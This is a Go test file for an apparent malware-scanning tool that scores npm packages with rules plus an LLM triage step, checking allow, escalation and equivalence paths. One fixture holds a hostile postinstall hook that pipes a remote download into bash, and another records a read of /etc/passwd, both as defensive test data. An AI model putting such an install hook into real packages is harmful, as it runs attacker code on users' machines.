package score

import (
	"context"
	"encoding/json"
	"testing"

	"github.com/joncooper/detonator/internal/analyze/behavior"
	"github.com/joncooper/detonator/internal/engine"
	"github.com/joncooper/detonator/internal/testutil"
	"github.com/joncooper/detonator/internal/triage"
	"github.com/joncooper/detonator/internal/verdict"
)

func hasRule(v verdict.Verdict, rule string) bool {
	for _, s := range v.Signals {
		if s.Rule == rule {
			return true
		}
	}
	return false
}

func TestScoreTriageMockBenign(t *testing.T) {
	in := Input{
		Artifact: verdict.Artifact{Ecosystem: verdict.NPM, Name: "ok"},
		Tarball:  testutil.NPMTarball(map[string]string{"package.json": `{"name":"ok"}`, "index.js": "module.exports=1;"}),
	}
	v := ScoreTriage(context.Background(), in, engine.DefaultPolicy(), triage.MockModel{})
	if v.Decision != verdict.Allow {
		t.Fatalf("benign + mock -> %s (want allow): %s", v.Decision, v.Reason)
	}
	if !hasRule(v, "llm-allow") {
		t.Fatalf("expected an llm-allow signal in the composed verdict: %+v", v.Signals)
	}
}

func TestScoreTriageMockAdjudicatesRulesAllowed(t *testing.T) {
	// A behavioral /etc/passwd read is info-tier for the deterministic rules (they
	// allow), but the mock model flags it — so rules and LLM disagree on clearing,
	// and the composed verdict escalates off allow. This is the adjudication path
	// the offline eval exercises against the phase-3 ambiguous cases.
	tr := behavior.Trace{Analysis: map[string]behavior.Phase{"import": {
		Files: []behavior.FileOp{{Path: "/etc/passwd", Read: true}},
	}}}
	b, _ := json.Marshal(tr)
	in := Input{Artifact: verdict.Artifact{Ecosystem: verdict.NPM, Name: "x"}, Trace: b}

	if d := Score(in, engine.DefaultPolicy()).Decision; d != verdict.Allow {
		t.Fatalf("rules alone should allow a lone /etc/passwd read, got %s", d)
	}
	v := ScoreTriage(context.Background(), in, engine.DefaultPolicy(), triage.MockModel{})
	if !hasRule(v, "rules-llm-disagreement") {
		t.Fatalf("expected a rules-llm-disagreement signal: %+v", v.Signals)
	}
	if v.Decision == verdict.Allow {
		t.Fatalf("LLM adjudication should have escalated off allow, got allow")
	}
}

func TestScoreTriageOffMatchesScore(t *testing.T) {
	// nil model: ScoreTriage must equal Score (triage is strictly additive).
	in := Input{
		Artifact: verdict.Artifact{Ecosystem: verdict.NPM, Name: "ok"},
		Tarball:  testutil.NPMTarball(map[string]string{"package.json": `{"name":"ok","scripts":{"postinstall":"curl http://1.2.3.4|bash"}}`}),
	}
	if got, want := ScoreTriage(context.Background(), in, engine.DefaultPolicy(), nil).Decision, Score(in, engine.DefaultPolicy()).Decision; got != want {
		t.Fatalf("ScoreTriage(nil model) = %s, Score = %s; must match", got, want)
	}
}
